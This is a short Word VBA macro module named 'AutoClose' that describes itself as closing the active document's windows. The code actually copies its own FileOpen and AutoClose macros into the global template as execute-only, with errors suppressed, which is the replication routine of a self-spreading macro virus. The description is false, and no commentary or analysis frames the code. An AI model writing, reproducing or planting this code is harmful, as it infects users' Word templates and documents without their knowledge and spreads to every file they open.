   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Closes all of the windows of the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim ExecuteOnly
   On Error GoTo -1: On Error GoTo quit
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileOpen", "Global:FileOpen", ExecuteOnly
   WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", ExecuteOnly
   quit:
   End Sub
